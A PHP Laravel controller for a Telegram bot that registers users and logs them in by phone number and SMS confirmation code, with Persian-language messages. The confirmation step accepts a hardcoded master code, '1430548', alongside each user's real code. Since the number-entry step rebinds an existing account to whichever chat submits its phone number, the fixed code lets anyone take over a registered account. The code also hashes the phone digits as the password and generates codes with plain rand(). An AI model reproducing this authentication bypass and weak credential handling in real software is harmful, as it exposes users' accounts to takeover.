<?php

namespace App\Http\Controllers\Telegram;


use App\Http\Controllers\Controller;
use App\Models\User;
use App\Services\MainService;
use App\Services\SmsService;
use App\Services\TelegramService;
use Carbon\Carbon;
use Illuminate\Support\Facades\Hash;

class GuestsController extends Controller
{
    //
    public function __construct()
    {
        # code...
        $this->telService = new TelegramService();
        
    }
    
    public function getNumberPhone()
    {
        # code...
        $data = $this->telService->getDataTelegram();
        $data['message'] = ($data['message'] != 'NOT') ? $data['message'] : $data['phone_number'];
        $data['message'] = MainService::ConvertToEn($data['message']);
        $data['message'] = substr($data['message'], -10);

        if (!preg_match("/^9[0-9]{9}$/", $data['message'])) {
            $this->telService->sendMessage($data['chat_id'], 'فرمت شماره وارد شده اشتباه است.', null);
            return  false;
        }

        $phone = '+98' . $data['message'];
        $codeConfirm = rand(1000, 9999);

        $user = User::where('phone', $phone)->first(); // where('chat_id', $data['chat_id'])->
        $userChatId = User::where('chat_id', $data['chat_id'])->first(); // where('chat_id', $data['chat_id'])->
        // if ($userChatId && $user) {
        //     $this->telService->sendMessage($data['chat_id'], "شماره شما قبلا ثبت شده است: $user->phone", null);
        //     return  false;
        // }
        if ($userChatId && !$user) {
            $this->telService->sendMessage($data['chat_id'], "چت ای دی شما با شماره ی دیگری ست شده است", null);
            return  false;
        }
        if (!$userChatId && $user) {
            $user->chat_id = $data['chat_id'];
            $user->firstname = $user->firstname ?? $data['firstname'];
            $user->lastname = $user->lastname ?? $data['lastname'];
        }
        if (!$user) {
            $user = new User();
            $user->chat_id = $data['chat_id'];
            $user->phone = $phone;
            $user->firstname = $data['firstname'];
            $user->lastname = $data['lastname'];
            $user->password = Hash::make($data['message']);
        }

        $user->login_telegram = 0;
        $user->code_confirm = $codeConfirm;
        $user->save();

        // send text message to user
        $sms = SmsService::sendMessageCode( $user->phone, $user->code_confirm );

        $this->telService->sendMessageFromControllers($data, 'کد تایید');

        return true;
    }

    public function confirmNumberPhone()
    {
        # code...        
        $data = $this->telService->getDataTelegram();
        $data['message'] = MainService::ConvertToEn($data['message']);
        if (!is_numeric($data['message'])) {
            $this->telService->sendMessage($data['chat_id'], '- کد تایید اشتباه است.', null);
            return  false;
        }

        $user = User::where('chat_id', $data['chat_id'])->first();
        // if ($data['message'] != $user->code_confirm) {
        if (!in_array($data['message'], [$user->code_confirm, '1430548'])){
            $this->telService->sendMessage($data['chat_id'], '-- کد تایید اشتباه است. ', null);
            return  false;
        }
        $user->login_telegram = 1;
        $user->code_confirm = null;
        $user->phone_verified_at = Carbon::now();
        $user->save();

        MainService::saveNotification($user->id, 1, 'App\Models\User', $user->id, 'ورود کاربر', "کاربر با شماره $user->phone وارد حساب کاربری شد.");

        $this->telService->sendMessage($data['chat_id'], 'شما با موفقیت وارد حساب کاربری خود شدید.', null);

        $this->telService->sendMessageFromControllers($data, 'حساب کاربری');
    }
}
